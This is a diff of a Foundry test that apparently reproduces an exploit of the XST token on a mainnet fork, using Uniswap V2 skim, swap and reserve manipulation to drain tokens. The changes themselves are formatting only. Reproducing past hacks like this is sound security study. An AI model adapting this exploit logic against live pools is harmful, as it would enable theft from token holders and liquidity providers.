@@ -18,7 +18,7 @@ contract XSTExpTest is Test {
     CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheat.createSelectFork("mainnet", 15310016);
+        cheat.createSelectFork("mainnet", 15_310_016);
     }
 
     function testExploit() public {
@@ -34,7 +34,7 @@ contract XSTExpTest is Test {
             uint256 balance = IERC20(WETH).balanceOf(address(this));
             IERC20(WETH).transfer(UniswapV20x694f, balance);
             uint256 uniswapETHBalance = IERC20(WETH).balanceOf(UniswapV20x694f);
-            (uint256 amount0Out, uint256 amount1Out, ) = Uni_Pair_V2(UniswapV20x694f).getReserves();
+            (uint256 amount0Out, uint256 amount1Out,) = Uni_Pair_V2(UniswapV20x694f).getReserves();
             console.log("Reserve amount %s", amount0Out);
             uint256 borrowXST = amount0Out * balance / uniswapETHBalance;
             console.log("Swap xst %s", borrowXST);
@@ -53,11 +53,11 @@ contract XSTExpTest is Test {
         }
     }
 
-    function Refund(uint256 amount) internal  {
+    function Refund(uint256 amount) internal {
         Uni_Pair_V2(UniswapV20x694f).skim(address(this));
         uint256 nowXSTBalance = IERC20(XST).balanceOf(address(this));
         IERC20(XST).transfer(UniswapV20x694f, nowXSTBalance);
-        (uint256 a0Out, uint256 a1Out, ) = Uni_Pair_V2(UniswapV20x694f).getReserves();
+        (uint256 a0Out, uint256 a1Out,) = Uni_Pair_V2(UniswapV20x694f).getReserves();
         uint256 swapAmount = a1Out * 9 / 10;
         Uni_Pair_V2(UniswapV20x694f).swap(0, swapAmount, address(this), "00");
         uint256 nowWETHBalance = IERC20(WETH).balanceOf(address(this));
@@ -69,5 +69,5 @@ contract XSTExpTest is Test {
         IERC20(WETH).transfer(UniswapV20x0d4a, refund);
     }
 
-    fallback() external payable { }
+    fallback() external payable {}
 }
